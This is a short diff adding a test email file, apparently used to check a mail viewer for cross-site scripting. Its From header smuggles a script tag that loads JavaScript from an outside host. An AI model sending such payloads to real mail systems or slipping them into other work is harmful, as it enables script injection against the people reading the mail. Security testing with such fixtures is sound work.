@@ -1,0 +1,7 @@
+From: <"test</script><script/src=//yoursitejs.com></script>@attack.com">
+To: nrd2b4@msn.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
